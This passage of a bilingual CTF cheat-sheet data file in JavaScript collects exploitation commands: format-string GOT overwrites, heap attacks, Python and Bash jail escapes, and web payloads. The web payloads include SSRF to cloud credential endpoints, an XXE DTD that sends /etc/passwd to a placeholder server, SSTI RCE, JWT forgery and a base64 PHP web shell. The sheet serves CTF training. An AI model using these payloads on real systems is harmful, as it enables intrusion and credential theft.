    description_en: "printf(user_input) without a format string → arbitrary memory read and write. %p to leak addresses (canary, libc), %n to write (GOT overwrite). pwntools fmtstr_payload() automates the write.",
    commands: [
      { label: "Détecter une format string vuln", label_en: "Detect a format string vulnerability", cmd: "# Envoyer des format specifiers :\necho '%p.%p.%p.%p.%p' | ./binary\n# Si des adresses s'affichent -> vulnérable !\n\n# Crash avec %s (string invalide) :\necho '%s%s%s' | ./binary\n\n# Pour les CTF en réseau :\nfor i in $(seq 1 100); do echo \"%$i\\$p\" | nc target 1337; done" },
      { label: "Lire la stack — trouver son offset", label_en: "Read the stack — find your offset", cmd: "# Chaque %N$p lit le Nème argument (registre ou stack)\n# En 64-bit : args 1-6 dans rsi,rdx,rcx,r8,r9 + stack\necho 'AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p' | ./binary\n# Chercher 0x41414141 -> offset de votre input\n\n# Sizes de leak :\n# %hhx = 1 byte, %hx = 2 bytes, %x = 4 bytes, %lx = 8 bytes\n\n# OWASP format string table :\n# https://owasp.org/www-community/attacks/Format_string_attack" },
      { label: "GOT overwrite avec fmtstr_payload (pwntools)", label_en: "GOT overwrite with fmtstr_payload (pwntools)", cmd: "python3 << 'EOF'\nfrom pwn import *\nbinary = ELF('./binary')\np = process('./binary')\n\n# Écraser printf@got par win() :\nprintf_got = binary.got['printf']\nwin_addr   = binary.symbols['win']\n\n# offset = position de votre input dans les args printf\noffset = 6  # trouvé avec %1$p %2$p ... jusqu'à voir AAAA\n\npayload = fmtstr_payload(offset, {printf_got: win_addr})\np.sendline(payload)\np.interactive()\nEOF" },
      { label: "Leak d'adresse arbitraire avec %s", label_en: "Arbitrary address leak with %s", cmd: "python3 << 'EOF'\nfrom pwn import *\np = process('./binary')\naddr = 0x601030  # adresse GOT puts par ex\n\n# %N$s lit la string pointée par le Nème argument\n# Placer l'adresse dans l'input -> calculer son offset\noffset = 6\npayload = p64(addr) + f'.%{offset}$s'.encode()\np.sendline(payload)\ndata = p.recv()\nprint('Leaked:', data)\nEOF" },
      { label: "Canary leak via format string", label_en: "Canary leak via format string", cmd: "python3 << 'EOF'\nfrom pwn import *\np = process('./binary')\n\n# Le canary est sur la stack, souvent au format 0x...00 (null byte final)\n# Tester %N$p jusqu'à trouver une valeur qui finit par 0x00\nfor i in range(1, 50):\n    p2 = process('./binary')\n    p2.sendline(f'%{i}$p'.encode())\n    out = p2.recv()\n    val = out.strip()\n    if val.endswith(b'00'):\n        print(f'Canary possible a offset {i}: {val}')\n    p2.close()\nEOF" }
    ],
    lookfor: [
      "printf(buf) ou fprintf/sprintf avec user input sans format string → vulnérabilité directe",
      "%p affiche des adresses → lecture arbitraire confirmée",
      "Valeur finissant par \\x00 dans le leak stack → canary candidat",
      "Adresse dans la plage libc → leak ASLR → possible pivot vers ret2libc"
    ],
    lookfor_en: [
      "printf(buf) or fprintf/sprintf with user input and no format string → direct vulnerability",
      "%p prints addresses → arbitrary read confirmed",
      "Value ending with \\x00 in stack leak → canary candidate",
      "Address in libc range → ASLR leak → possible pivot to ret2libc"
    ],
    tips: [
      "fmtstr_payload() de pwntools génère automatiquement le payload d'écriture GOT",
      "En 64-bit : les 5 premiers args sont dans des registres (rsi/rdx/rcx/r8/r9), le 6ème est sur la stack",
      "%7$p est souvent plus stable que des adresses directes pour les leaks en CTF",
      "printf@got -> system : technique classique pour shell via format string"
    ],
    tips_en: [
      "pwntools fmtstr_payload() automatically generates the GOT write payload",
      "In 64-bit: the first 5 args are in registers (rsi/rdx/rcx/r8/r9), the 6th is on the stack",
      "%7$p is often more stable than direct addresses for CTF leaks",
      "printf@got → system: classic technique to get a shell via format string"
    ],
    choices: [
      { label: "Shell ou flag obtenu !", label_en: "Shell or flag obtained!", next: "flag_found", icon: "🏁" },
      { label: "Retour à binary exploitation", label_en: "Back to binary exploitation", next: "binary_exploit", icon: "💣" }
    ]
  },

  "heap_exploit": {
    id: "heap_exploit", title: "Heap Exploitation (UAF / Double Free)", title_en: "Heap Exploitation (UAF / Double Free)", category: "ctf", icon: "🗑️",
    description: "Exploitation du tas : use-after-free, double free, heap overflow. Techniques modernes : tcache poisoning (glibc 2.26+), fastbin attack, unsafe unlink. how2heap (shellphish) est la référence.",
    description_en: "Heap exploitation: use-after-free, double free, heap overflow. Modern techniques: tcache poisoning (glibc 2.26+), fastbin attack, unsafe unlink. how2heap (shellphish) is the reference.",
    commands: [
      { label: "Analyser le heap avec GDB + pwndbg", label_en: "Analyze the heap with GDB + pwndbg", cmd: "gdb ./binary\n# Dans pwndbg :\nheap             # état complet du heap\nbins             # free bins (tcache, fastbin, smallbin, etc.)\nchunks           # tous les chunks\nvis_heap_chunks  # visualisation graphique\n\n# Dans GEF :\n(gdb) heap chunks\n(gdb) heap bins" },
      { label: "Détecter UAF / Double Free", label_en: "Detect UAF / Double Free", cmd: "# UAF : utiliser un pointeur après free()\n# Symptômes : menu avec alloc/free/use\nvalgrind --tool=memcheck ./binary\n\n# AddressSanitizer :\ngcc -fsanitize=address -o binary_asan binary.c && ./binary_asan\n\n# seccomp-tools pour voir les syscalls autorisés :\nseccomp-tools dump ./binary" },
      { label: "Tcache Poisoning (glibc >= 2.26)", label_en: "Tcache Poisoning (glibc >= 2.26)", cmd: "python3 << 'EOF'\nfrom pwn import *\np = process('./binary')\n\n# Pattern tcache poisoning :\n# 1. Allouer chunk A (size S)\n# 2. Free chunk A -> dans tcache bin[S]\n# 3. UAF : écrire adresse cible dans fd de A (tcache next pointer)\n# 4. Allouer chunk B (size S) -> chunk A revient\n# 5. Allouer chunk C (size S) -> chunk à l'adresse cible !\n\n# Cibles habituelles :\n# __free_hook ou __malloc_hook -> system() (glibc < 2.34)\n# GOT entries si pas de RELRO full\nEOF" },
      { label: "Leak d'adresse libc via unsorted bin", label_en: "Libc address leak via unsorted bin", cmd: "# Un chunk en unsorted bin a des pointeurs fwd/bk vers main_arena (dans libc)\n# Lire le contenu d'un chunk libéré -> leak adresse main_arena\npython3 << 'EOF'\nfrom pwn import *\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n# Offset main_arena depuis la base libc :\nmain_arena_offset = libc.symbols['__malloc_hook'] + 0x10\nprint(f'main_arena offset: {hex(main_arena_offset)}')\n# libc_base = leaked_addr - main_arena_offset\nEOF" },
      { label: "House of Force / heap metadata overwrite", label_en: "House of Force / heap metadata overwrite", cmd: "# Si on peut déborder au-delà de la taille allouée :\n# 1. Modifier le size field du chunk suivant\n# 2. Modifier prev_size / IS_MMAPPED bits\n# 3. Déclencher une consolidation malveillante\n\n# how2heap (shellphish/how2heap) :\n# https://github.com/shellphish/how2heap\n# Exemples compilés + debugger intégré\n\n# Vérifier version glibc :\nldd ./binary | grep libc\n./binary; file /proc/$(pgrep binary)/exe" }
    ],
    lookfor: [
      "Menu avec alloc/free/use/print → pattern typique UAF en CTF",
      "Double free possible → tcache poisoning (glibc >= 2.26)",
      "Heap overflow sur un chunk → écraser métadonnées du chunk suivant",
      "Leak d'adresse heap → calculer base du heap pour des attaques avancées"
    ],
    lookfor_en: [
      "Menu with alloc/free/use/print → typical UAF pattern in CTF",
      "Double free possible → tcache poisoning (glibc >= 2.26)",
      "Heap overflow on a chunk → overwrite metadata of the next chunk",
      "Heap address leak → compute heap base for advanced attacks"
    ],
    tips: [
      "pwndbg 'vis_heap_chunks' rend l'analyse du heap très visuelle",
      "how2heap (github.com/shellphish/how2heap) : exemples de TOUTES les techniques, avec debugger",
      "Les CTF modernes utilisent tcache poisoning → technique à maîtriser en premier",
      "Vérifier la version glibc : les protections varient (safe-linking en 2.32+, __free_hook supprimé en 2.34+)"
    ],
    tips_en: [
      "pwndbg 'vis_heap_chunks' makes heap analysis very visual",
      "how2heap (github.com/shellphish/how2heap): examples of ALL techniques, with debugger",
      "Modern CTFs use tcache poisoning → master this technique first",
      "Check the glibc version: protections vary (safe-linking in 2.32+, __free_hook removed in 2.34+)"
    ],
    choices: [
      { label: "Shell obtenu → flag !", label_en: "Shell obtained → flag!", next: "flag_found", icon: "🏁" },
      { label: "Retour à binary exploitation", label_en: "Back to binary exploitation", next: "binary_exploit", icon: "💣" }
    ]
  },

  // ── WEB CTF PATTERNS ─────────────────────────────────────────────────────────
  "web_ctf_patterns": {
    id: "web_ctf_patterns", title: "Web CTF — Patterns Courants", title_en: "Web CTF — Common Patterns", category: "ctf", icon: "🌐",
    description: "Patterns typiques des challenges web CTF : SSRF, XXE, SSTI avancé, HTTP request smuggling, race conditions, lecture de code source (PHP wrappers, .git exposé, backup files), JWT attacks.",
    description_en: "Typical CTF web challenge patterns: SSRF, XXE, advanced SSTI, HTTP request smuggling, race conditions, source code reading (PHP wrappers, exposed .git, backup files), JWT attacks.",
    commands: [
      { label: "SSRF — Server-Side Request Forgery", label_en: "SSRF — Server-Side Request Forgery", cmd: "# Injecter des URLs internes :\ncurl 'http://target.ctf/?url=http://localhost/admin'\ncurl 'http://target.ctf/?url=http://127.0.0.1:8080/'\n# Protocoles alternatifs :\ncurl 'http://target.ctf/?url=file:///etc/passwd'\ncurl 'http://target.ctf/?url=dict://localhost:6379/KEYS *'\n# Cloud metadata (AWS) :\ncurl 'http://target.ctf/?url=http://169.254.169.254/latest/meta-data/'\ncurl 'http://target.ctf/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# GCP :\ncurl 'http://target.ctf/?url=http://metadata.google.internal/computeMetadata/v1/'\n# Azure :\ncurl 'http://target.ctf/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'" },
      { label: "XXE — XML External Entity", label_en: "XXE — XML External Entity", cmd: "# Payload XXE dans une requête XML :\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n\n# XXE Blind via DNS :\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://YOUR_SERVER/evil.dtd\"> %xxe; ]>\n<foo>&xxe;</foo>\n\n# evil.dtd :\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_SERVER/?data=%file;'>\">\n%eval;\n%exfil;" },
      { label: "SSTI — Server-Side Template Injection", label_en: "SSTI — Server-Side Template Injection", cmd: "# Détecter : injecter {{7*7}} ou ${7*7} ou #{7*7}\n\n# Jinja2 (Python/Flask) :\n{{config}}\n{{request.environ}}\n# RCE :\n{{''.__class__.__mro__[1].__subclasses__()}}\n{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()}}\n\n# Twig (PHP) :\n{{7*'7'}} -> 49 = Twig | '7777777' = Jinja2\n{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n\n# Automatisation :\n# tplmap : https://github.com/epinna/tplmap\ntplmap -u 'http://target.ctf/?name=*'" },
      { label: "JWT — attaques sur les tokens", label_en: "JWT — token attacks", cmd: "# Décoder : jwt.io\n# Début base64 en 'ey' -> JWT\n\n# 1. Algorithm 'none' :\npython3 << 'EOF'\nimport base64, json\nheader = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')\npayload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('=')\nprint(f'{header}.{payload}.')\nEOF\n\n# 2. RS256 -> HS256 confusion (clé publique comme secret HMAC) :\njwt_tool token.txt -T -S hs256 -p public.pem\n\n# 3. Brute force secret :\necho 'TOKEN' > jwt.txt\njohn jwt.txt\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n\n# sqlmap sur JWT :\nsqlmap -u 'http://target.ctf/' --cookie='auth=TOKEN' --level 3" },
      { label: "Race Condition", label_en: "Race Condition", cmd: "# Burp Suite Repeater : groupe de requêtes -> 'Send group in parallel'\n# (méthode la plus précise pour HTTP/2)\n\n# Python threading :\npython3 << 'EOF'\nimport requests\nimport threading\n\ndef redeem():\n    r = requests.post('http://target.ctf/redeem', data={'code': 'COUPON'})\n    print(r.status_code, r.text[:50])\n\nthreads = [threading.Thread(target=redeem) for _ in range(50)]\nfor t in threads: t.start()\nfor t in threads: t.join()\nEOF\n\n# Turbo Intruder (Burp plugin) : encore plus précis" },
      { label: "Lire code source (PHP wrappers / .git / backups)", label_en: "Read source code (PHP wrappers / .git / backups)", cmd: "# PHP wrappers (LFI -> RCE ou source):\ncurl 'http://target.ctf/?page=php://filter/convert.base64-encode/resource=index.php'\ncurl 'http://target.ctf/?page=php://filter/read=string.rot13/resource=../config.php'\ncurl 'http://target.ctf/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+'\n\n# .git exposé :\ngit-dumper http://target.ctf/.git/ ./repo\ncd repo && git log --oneline && git diff HEAD~1\n\n# Backup files :\nferoxbuster -u http://target.ctf -w wordlist.txt -x php~,.bak,.old,.php.bak,.orig\n\n# SQLmap :\nsqlmap --forms --dump-all -u 'http://target.ctf/'" },
      { label: "Fuzzing champs d'entrée (FFUF)", label_en: "Input field fuzzing (FFUF)", cmd: "# Fuzzing paramètres et chemins :\nffuf -u 'http://target.ctf/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt\n\n# Fuzzing avec requête capturée :\nffuf -request input.req -request-proto http \\\n    -w /usr/share/seclists/Fuzzing/special-chars.txt -mc all -fs 0\n\n# gobuster dirs :\ngobuster dir -u http://target.ctf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt" }
    ],
    lookfor: [
      "Paramètre url= ou path= ou redirect= → SSRF",
      "Upload ou parsing XML → XXE",
      "Champs affichés dans la page avec {{ ou ${ → SSTI",
      "Cookie JWT (commence par eyJ) → tenter 'none' alg, HS256 confusion, brute force",
      "Action unique (vote, paiement, coupon) → race condition",
      "/.git/ accessible ou erreurs PHP avec chemins → lecture de source code"
    ],
    lookfor_en: [
      "Parameter url= or path= or redirect= → SSRF",
      "XML upload or parsing → XXE",
      "Fields reflected in the page with {{ or ${ → SSTI",
      "JWT cookie (starts with eyJ) → try 'none' alg, HS256 confusion, brute force",
      "Single-action endpoint (vote, payment, coupon) → race condition",
      "/.git/ accessible or PHP errors with paths → source code reading"
    ],
    tips: [
      "SSRF vers 169.254.169.254 → metadata cloud (AWS/GCP/Azure → credentials IAM)",
      "SSTI : tplmap automatise la détection et l'exploitation pour Jinja2, Twig, etc.",
      "JWT : toujours tester 'none' algorithm et HS256 avec clé vide/nulle/'secret'",
      "Race condition : Burp Suite Turbo Intruder avec HTTP/2 est plus précis que threading Python",
      "PayloadsAllTheThings (github.com/swisskyrepo/PayloadsAllTheThings) : référence pour tous les payloads web"
    ],
    tips_en: [
      "SSRF to 169.254.169.254 → cloud metadata (AWS/GCP/Azure → IAM credentials)",
      "SSTI: tplmap automates detection and exploitation for Jinja2, Twig, etc.",
      "JWT: always test 'none' algorithm and HS256 with empty/null/'secret' key",
      "Race condition: Burp Suite Turbo Intruder with HTTP/2 is more precise than Python threading",
      "PayloadsAllTheThings (github.com/swisskyrepo/PayloadsAllTheThings): reference for all web payloads"
    ],
    choices: [
      { label: "RCE obtenu via web → flag !", label_en: "RCE obtained via web → flag!", next: "flag_found", icon: "🏁" },
      { label: "Fichiers internes accessibles → chercher flag", label_en: "Internal files accessible → search for flag", next: "flag_found", icon: "🏁" },
      { label: "Techniques web générales", label_en: "General web techniques", next: "web_initial", icon: "🌐" }
    ]
  },

  // ── MISC CTF ──────────────────────────────────────────────────────────────────
  "misc_ctf": {
    id: "misc_ctf", title: "Misc CTF — Challenges Divers", title_en: "Misc CTF — Miscellaneous Challenges", category: "ctf", icon: "🎲",
    description: "Challenges miscellaneous : Python jail escape (bypass sandbox), Bash jail, OSINT, scripting, encodages exotiques, QR codes, puzzles logiques, langages ésotériques, fichiers polyglots.",
    description_en: "Miscellaneous challenges: Python jail escape (sandbox bypass), Bash jail, OSINT, scripting, exotic encodings, QR codes, logic puzzles, esoteric languages, polyglot files.",
    commands: [
      { label: "Python Jail Escape — bibliothèques d'exécution directe", label_en: "Python Jail Escape — direct execution libraries", cmd: "# Si des bibliothèques sont déjà importées :\nos.system('ls')\nos.popen('ls').read()\nsubprocess.call('ls', shell=True)\npty.spawn('/bin/bash')\nplatform.os.system('ls')\npdb.os.system('ls')\n\n# Via __import__ :\n__import__('os').system('id')\n__builtins__.__dict__['__import__']('os').system('id')\nimportlib.import_module('os').system('ls')\nsys.modules['os'].system('ls')\n\n# Lire des fichiers :\nopen('/etc/passwd').read()\nopen('/flag.txt').read()" },
      { label: "Python Jail — traversée de __subclasses__", label_en: "Python Jail — __subclasses__ traversal", cmd: "# Sans import direct, via MRO et __subclasses__ :\n# Python 2 (offset 40 = file, 59 = warnings.catch_warnings) :\n().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()\n().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')\n\n# Python 3 (chercher la classe avec le bon index) :\n# Lister : [c.__name__ for c in ().__class__.__mro__[1].__subclasses__()]\n\n# Obtenir builtins depuis des fonctions builtin :\nhelp.__call__.__builtins__\nprint.__self__\nglobals.__self__" },
      { label: "Python Jail — encodages et eval/exec", label_en: "Python Jail — encodings and eval/exec", cmd: "# Bypass blacklists via encodage :\n# Octal :\nexec(\"\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\47\\157\\163\\47\\51\\56\\163\\171\\163\\164\\145\\155\\50\\47\\154\\163\\47\\51\")\n# Hex :\nexec(\"\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x27\\x6c\\x73\\x27\\x29\")\n# Base64 :\nexec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))\n\n# Walrus operator dans eval (multi-statement) :\n[a:=__import__('os'), a.system('id')]\n\n# UTF-7 bypass :\n# coding: utf_7 dans une magic comment de fichier Python" },
      { label: "Python Jail — decorators et overloading (sans appels directs)", label_en: "Python Jail — decorators and overloading (without direct calls)", cmd: "# RCE via decorators :\n@exec\n@input\nclass X:\n    pass\n# Envoyer le code Python quand la saisie est demandée\n\n# RCE via overloading de dunder methods :\nclass RCE:\n    def __init__(self):\n        self += 'import os; os.system(\"sh\")'\n    __iadd__ = exec\nrce = RCE()\n\n# Via exceptions :\nclass Klecko(Exception):\n    __add__ = exec\ntry:\n    raise Klecko\nexcept Klecko as k:\n    k + 'import os; os.system(\"sh\")'\n\n# Via sys.excepthook :\nclass X:\n    def __init__(self, a, b, c): self += \"os.system('sh')\"\n    __iadd__ = exec\nsys.excepthook = X\n1/0  # déclencher l'exception" },
      { label: "Bash Jail Escape", label_en: "Bash Jail Escape", cmd: "# Lister les commandes disponibles :\ncompgen -c 2>/dev/null | head -20\nls /bin /usr/bin 2>/dev/null\n\n# Lire des fichiers sans cat :\nwhile read line; do echo $line; done < /etc/passwd\nhead -c 9999 /flag.txt\nless /flag.txt\n\n# Exécution sans slash (encodage hex) :\n$'\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68'  # /bin/bash\n\n# Via variable :\ncmd=id; $cmd\neval $(echo 'id')\n\n# GTFOBins : https://gtfobins.github.io/\n# Chaque binaire avec SUID ou capabilities peut donner un shell" },
      { label: "OSINT — recherche d'informations", label_en: "OSINT — information gathering", cmd: "# Recherche image inverse :\n# images.google.com, tineye.com, yandex.com/images\n# pimeyes.com (faces)\n# GeoSpy AI : https://geospy.ai\n# Overpass Turbo (OSM) : https://overpass-turbo.eu\n\n# Metadata :\nexiftool image.jpg | grep -i 'GPS\\|Location\\|Author\\|Comment'\n\n# Username research :\n# github.com/search?q=username\n# intelx.io, sherlock, maigret\n\n# Wayback Machine :\n# web.archive.org -> chercher des pages supprimées\n\n# DNS :\ndig target.com TXT\ndig target.com ANY\n# crt.sh pour les certificats SSL exposés" },
      { label: "Scripting — automatiser un challenge", label_en: "Scripting — automate a challenge", cmd: "python3 << 'EOF'\nimport requests\nimport hashlib\n\n# Proof-of-work hashcash :\nprefix = b'CTF2024'\nfor i in range(10_000_000):\n    h = hashlib.sha256(prefix + str(i).encode()).hexdigest()\n    if h.startswith('0000'):\n        print(f'Nonce: {i}, Hash: {h}')\n        break\nEOF\n\n# Solve en remote avec pwntools :\nfrom pwn import *\np = remote('target.ctf', 1337)\np.recvuntil('prefix: ')\nprefix = p.recvline().strip()" },
      { label: "Langages ésotériques et encodages exotiques", label_en: "Esoteric languages and exotic encodings", cmd: "# Identifier un esolang :\n# Googler un token distinctif, puis esolangs.org/wiki/Main_Page\n\n# Brainfuck : +-<>[].,\n# Interpréteur : https://copy.sh/brainfuck\n\n# Whitespace : espaces/tabulations/newlines seulement\n# https://vii5ard.github.io/whitespace/\n\n# JSfuck : []()!+\n# AAencode (Unicode)\n# Piet (image comme programme)\n\n# Multi-base decoder :\n# https://github.com/mufeedvh/basecrack\nbasecrack -s 'ENCODED_STRING'\n\n# Morse audio ou texte :\n# https://morsecode.world/international/decoder/audio-decoder-adaptive.html" },
      { label: "Fichiers polyglots et formats cachés", label_en: "Polyglot files and hidden formats", cmd: "# Vérifier le type réel :\nfile mysterious\n\n# Zip+JPEG polyglot :\nunzip -l mysterious.jpg\n7z l mysterious.jpg\n\n# PDF avec données cachées :\npdf-parser.py challenge.pdf\npdfid.py challenge.pdf\n\n# Office OOXML (docx/xlsx) :\nunzip file.docx -d out/\nfind out/ -name '*.xml' | xargs grep -i flag\n\n# Extraire macros VBA :\n# https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php" }
    ],
    lookfor: [
      "Challenge sans catégorie claire → essayer tous les encodages (CyberChef Magic)",
      "Code source Python avec restrictions import ou builtins → jail escape via MRO",
      "Exécution Python sans appels () → decorators, overloading, exceptions",
      "Image avec lieu ou personne → OSINT (GeoSpy, PimEyes, reverse image)",
      "Service réseau interactif avec délai → souvent proof-of-work ou scripting",
      "Fichier avec extension incorrecte → vérifier avec file et magic bytes"
    ],
    lookfor_en: [
      "Challenge with no clear category → try all encodings (CyberChef Magic)",
      "Python source code with restricted imports or builtins → jail escape via MRO",
      "Python execution without () calls → decorators, overloading, exceptions",
      "Image with a location or person → OSINT (GeoSpy, PimEyes, reverse image search)",
      "Interactive network service with delays → often proof-of-work or scripting",
      "File with wrong extension → verify with file and magic bytes"
    ],
    tips: [
      "Python jail : tester __builtins__, globals(), locals(), dir() pour énumérer l'environnement",
      "esolangs.org pour identifier les langages ésotériques depuis un token distinctif",
      "OSINT : commencer par les métadonnées EXIF, puis Wayback Machine, puis recherche inversée",
      "basecrack (mufeedvh/basecrack) décode automatiquement Base16/32/36/58/64/85/91/92",
      "Les challenges 'misc' cachent souvent des techniques d'autres catégories (stego, crypto, pwn)"
    ],
    tips_en: [
      "Python jail: test __builtins__, globals(), locals(), dir() to enumerate the environment",
      "esolangs.org to identify esoteric languages from a distinctive token",
      "OSINT: start with EXIF metadata, then Wayback Machine, then reverse image search",
      "basecrack (mufeedvh/basecrack) automatically decodes Base16/32/36/58/64/85/91/92",
      "Misc challenges often hide techniques from other categories (stego, crypto, pwn)"
    ],
    choices: [
      { label: "Flag trouvé !", label_en: "Flag found!", next: "flag_found", icon: "🏁" },
      { label: "Stéganographie impliquée", label_en: "Steganography involved", next: "stego", icon: "🖼️" },
      { label: "Cryptographie impliquée", label_en: "Cryptography involved", next: "crypto", icon: "🔐" },
      { label: "Reverse engineering impliqué", label_en: "Reverse engineering involved", next: "reverse_eng", icon: "⚙️" }
    ]
  }

}); // fin Object.assign

// ─── Patch des nœuds existants ────────────────────────────────────────────────

// stego -> ajouter lien vers stego_advanced et stego_audio
NODES["stego"].choices.push(
  { label: "Techniques avancées (LSB, binwalk, zsteg, chunks PNG)", label_en: "Advanced techniques (LSB, binwalk, zsteg, PNG chunks)", next: "stego_advanced", icon: "🔬" },
  { label: "Stéganographie audio (spectrogramme, DTMF, WAV LSB)", label_en: "Audio steganography (spectrogram, DTMF, WAV LSB)", next: "stego_audio", icon: "🎵" },
  { label: "Stégo texte / documents (Unicode, OOXML, PDF)", label_en: "Text / document steganography (Unicode, OOXML, PDF)", next: "stego_text", icon: "📄" }
);

// crypto -> ajouter liens vers crypto avancée
NODES["crypto"].choices.push(
  { label: "RSA spécifiquement (factordb, Wiener, Hastad, Coppersmith…)", label_en: "RSA specifically (factordb, Wiener, Hastad, Coppersmith…)", next: "crypto_rsa", icon: "🔑" },
  { label: "ECC / ECDSA (nonce reuse, invalid curve)", label_en: "ECC / ECDSA (nonce reuse, invalid curve)", next: "crypto_ecc", icon: "📐" },
  { label: "AES / symétrique (ECB, padding oracle, nonce reuse CTR)", label_en: "AES / symmetric (ECB, padding oracle, CTR nonce reuse)", next: "crypto_symmetric", icon: "🔒" },
  { label: "Chiffrement classique (Vigenère, XOR, substitution…)", label_en: "Classical cipher (Vigenère, XOR, substitution…)", next: "crypto_classical", icon: "📜" }
);

// ── BINARY EXPLOITATION AVANCÉ — hacktricks ───────────────────────────────────

Object.assign(NODES, {

  "pwn_protections": {
    id: "pwn_protections", title: "Protections Binaires & Bypasses", title_en: "Binary Protections & Bypasses", category: "ctf", icon: "🛡️",
    description: "Comprendre ASLR, PIE, NX, Stack Canary, RELRO et leurs techniques de contournement. Source : hacktricks binary-exploitation/common-binary-protections-and-bypasses.",
    description_en: "Understanding ASLR, PIE, NX, Stack Canary, RELRO and their bypass techniques. Source: hacktricks binary-exploitation/common-binary-protections-and-bypasses.",
    commands: [
      { label: "Vérifier toutes les protections (checksec)", label_en: "Check all protections (checksec)", cmd: "checksec --file=./binary\n# NX      : stack non-exécutable → bypass par ROP\n# PIE     : adresses randomisées → bypass par leak\n# Canary  : protection overflow → bypass par leak du canary\n# RELRO Full    : GOT en lecture seule → pas de GOT overwrite\n# RELRO Partial : .plt.got writable → GOT overwrite possible\nreadelf -l ./binary | grep GNU_STACK   # RWE = NX désactivé\nreadelf -l ./binary | grep GNU_RELRO" },
      { label: "ASLR — statut et désactivation (debug)", label_en: "ASLR — status and disable (debug)", cmd: "cat /proc/sys/kernel/randomize_va_space\n# 0=désactivé, 1=partiel, 2=complet\n# Désactiver temporairement :\necho 0 | sudo tee /proc/sys/kernel/randomize_va_space\n# Désactiver pour une seule exécution :\nsetarch $(uname -m) -R ./binary\n# Vérifier les adresses depuis /proc :\ncat /proc/$(pgrep binary)/stat | awk '{print \"stack:\", $28, \"esp:\", $29}'" },
      { label: "ASLR bypass — brute force 32-bit", label_en: "ASLR bypass — brute force 32-bit", cmd: "# Sur 32-bit : ~16 bits d'entropie → 65536 possibilités max\n# Brute force de l'adresse de base libc :\npython3 -c \"\nfor off in range(0xb7000000, 0xb8000000, 0x1000):\n    # tester chaque offset\n    pass\n\"\n# En pratique :\nwhile ! ./exploit 2>/dev/null; do :; done" },
      { label: "Canary — leak et bypass", label_en: "Canary — leak and bypass", cmd: "# Canary Linux : toujours ??...??00 (null byte en LSB)\n# Leak via format string (trouver l'offset du canary sur la stack) :\npython3 -c \"print('%15\\$p')\" | ./binary  # ajuster N\n# Leak via read partielle :\n# Envoyer exactement buffer_size bytes → le null byte du canary est lu\n# Puis lire 7 bytes suivants = canary complet\n# Après leak du canary :\n# payload = b'A'*offset + p64(canary) + b'B'*8 + p64(win_addr)" },
      { label: "RELRO — exploitation selon le niveau", label_en: "RELRO — exploitation by level", cmd: "# Partial RELRO : .got.plt writable → GOT overwrite\n# → Écraser printf@got avec system : printf('/bin/sh') = shell\n# Full RELRO : GOT entièrement en RO (glibc < 2.34 : __free_hook, __malloc_hook)\nobjdump -R ./binary | grep -E 'printf|puts|exit'\n# Si Partial → cible idéale : exit@got ou printf@got" },
      { label: "PIE bypass — leak et rebase", label_en: "PIE bypass — leak and rebase", cmd: "# PIE randomise la base du binaire → besoin d'un leak d'adresse .text\n# Leak via format string :\npython3 -c \"print('%p.'*20)\" | ./binary\n# Chercher adresse 0x55... ou 0x56... (base PIE en Linux)\n# Calculer la base : pie_base = leaked - known_offset\n# pwntools rebase :\nbinary = ELF('./binary')\nbinary.address = pie_base  # rebase toutes les adresses" }
    ],
    lookfor: [
      "NX désactivé → shellcode directement sur la stack",
      "PIE désactivé → adresses .text/.plt fixes → pas besoin de leak",
      "Partial RELRO → GOT overwrite possible (printf → system)",
      "Canary présent → chercher un leak format string avant l'overflow",
      "ASLR sur 32-bit → brute force faisable en local"
    ],
    lookfor_en: [
      "NX disabled → shellcode directly on the stack",
      "PIE disabled → .text/.plt addresses fixed → no leak needed",
      "Partial RELRO → GOT overwrite possible (printf → system)",
      "Canary present → look for a format string leak before the overflow",
      "ASLR on 32-bit → brute force feasible locally"
    ],
    tips: [
      "checksec est le premier réflexe sur tout binaire CTF — il dicte la stratégie d'exploitation",
      "Partial RELRO + printf vulnérable = GOT overwrite classique et efficace",
      "En 64-bit avec PIE+ASLR : toujours chercher un info leak avant l'exploit",
      "setarch -R pour développer l'exploit localement sans ASLR"
    ],
    tips_en: [
      "checksec is the first reflex on any CTF binary — it dictates the exploitation strategy",
      "Partial RELRO + vulnerable printf = classic and effective GOT overwrite",
      "In 64-bit with PIE+ASLR: always look for an info leak before exploiting",
      "setarch -R to develop the exploit locally without ASLR"
    ],
    choices: [
      { label: "Stack overflow identifié", label_en: "Stack overflow identified", next: "bof_basic", icon: "💥" },
      { label: "Format string (leak + write)", label_en: "Format string (leak + write)", next: "format_string_vuln", icon: "📝" },
